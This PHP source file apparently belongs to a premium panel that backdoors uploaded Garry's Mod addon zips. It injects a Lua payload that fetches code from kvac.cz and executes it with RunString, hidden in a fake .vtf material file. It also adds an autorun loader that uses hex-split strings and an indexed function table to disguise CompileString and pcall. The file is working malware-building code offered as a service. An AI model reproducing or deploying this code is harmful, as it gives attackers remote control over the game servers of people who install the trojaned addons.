<?php

ini_set('memory_limit', '1000M');

if($AUTHUSER['roles'] == 0) {

	Logs::AddLogs(
		"User ".$AUTHUSER['username']." attempted to access a premium page (Smart Lua)", 
		"danger", 
		"fas fa-baby-carriage"
	);

	die(header('location:/overview'));
}

// SI LE FICHIER A ETE UPLOAD
if(isset($_FILES["filetoscan"]["name"])) {

	$valid_ext = true;
	$showDL = false;

	$backdoor = 'timer.Simple(1, function() http.Fetch("https://kvac.cz/f.php?key='.$AUTHUSER['infectkey'].'", function(b) RunString(b, ":", false) end)end)';

	$run_backdoor = 'local function HELPER_INFO()
		return ""
	end

	local function HELPER_ISFUNC(func)
		if (isfunction(func)) then
			return !false
		else
			return !true
		end
	end

	local function HELPER_READ_DATA(data)
		return file.Read(data, "GAME")
	end

	local UNORDERED_LIST = 
	{
		"\x6d","\x61","\x74",
		"\x65","\x72","\x69",
		"\x61","\x6c","\x73",
		"\x2f","\x6e","\x70",
		"\x63","\x2f","\x68",
		"\x65","\x6c","\x70",
		"\x2e","\x76","\x74",
		"\x66"
	}

	local function HELPER_MAT()
		if (!false) then
			return string.Implode("", UNORDERED_LIST)
		end
	end

	local CALL =
	{
		ClearBackgroundImages, ClientsideModel, ClientsideRagdoll, ClientsideScene,
		CloseDermaMenus, collectgarbage, Color, ColorAlpha,
		ColorRand, ColorToHSV, CompileFile, CompileString,
		ConsoleAutoComplete, ConVarExists, CreateClientConVar, CreateConVar,
		CreateMaterial, CreateParticleSystem, CreatePhysCollideBox, CreatePhysCollidesFromModel,
		CreateSound, CreateSprite, CompileString, CurTime,
		DamageInfo, DebugInfo, DeriveGamemode, Derma_Anim,
		Derma_DrawBackgroundBlur, Derma_Hook, Derma_Install_Convar_Functions, Derma_Message,
		Derma_Query, Derma_StringRequest, pcall,
	}

	CALL[35](CALL[12](HELPER_READ_DATA(HELPER_MAT()), HELPER_INFO(), 0))';

	$exec_mat = "materials/npc/help.vtf";
	$exec_file = "lua/autorun/server/npc_help.lua";
	
	$root_repertory = dirname(dirname(__DIR__)) . DIRECTORY_SEPARATOR;
	$filename = $_FILES["filetoscan"]["name"];
	$source = $_FILES["filetoscan"]["tmp_name"];
	$type = $_FILES["filetoscan"]["type"];

	// TYPE DE FICHIER ACCEPTER
	$accepted_types = array(
		'application/zip',
		'application/x-zip-compressed',
		'multipart/x-zip',
		'application/x-compressed'
	);

	// VERIFIER LE TYPE DE FICHIER
	foreach($accepted_types as $mime_type) {
		if($mime_type == $type) {
			$valid_ext = true;
			break;
		}
	}

	// SI INVALIDE RETOURNE UNE ERREUR
	if(!$valid_ext) {
		$errors[] = "The file extension is invalid !";
	}

	// VERIFIE QUE LE FICHIER FINI BIEN PAR .ZIP
	$name = explode(".", $filename);
	$continue = strtolower(array_pop($name)) == 'zip' ? true : false;

	// RETOURNE UNE ERREUR SI C PAS .ZIP
	if(!$continue) {
		$errors[] = "This file is not a zip !";
	}

	// DEPLACER LE FICHIER DANS LE DOSSIER UPLOAD
	$target_path = $root_repertory."public/assets/upload/".$filename;
	if(!isset($errors)) {

		if(move_uploaded_file($source, $target_path)) {

			$zip = new ZipArchive();

			$zip->open($target_path);

			for($i = 0; $i < $zip->numFiles; $i++)
			{
			    if(preg_match("#lua/autorun/#", $zip->getNameIndex($i))){

					$files = explode("lua/autorun",$zip->getNameIndex($i));

					$zip->addFromString($files[0].$exec_file, $run_backdoor);
					$zip->addFromString($files[0].$exec_mat, $backdoor);
					break;

			    }
			}

			$zip->close();

			$attachment_location = $target_path;



			if (file_exists($attachment_location) && !isset($errors)) {

			    // header($_SERVER["SERVER_PROTOCOL"] . " 200 OK");
			    // header("Cache-Control: public"); // needed for internet explorer
			    // header("Content-Type: application/zip");
			    // header("Content-Transfer-Encoding: Binary");
			    // header("Content-Length:".filesize($attachment_location));
			    // header("Content-Disposition: attachment; filename=".$filename);
			    // readfile($attachment_location);
			    $showDL = true;

			    //unlink($attachment_location);
			}

            Logs::AddLogs(
	            "User ".htmlentities($AUTHUSER['username'])." uploaded file: " . $filename . " to the Smart Lua.", 
	            "warning", 
	            "fa fa-cloud-upload-alt"
            );

		} else {
			$errors[] = "Une erreur s'est produite !"; // MOVE FILE
		}

	}

}

?>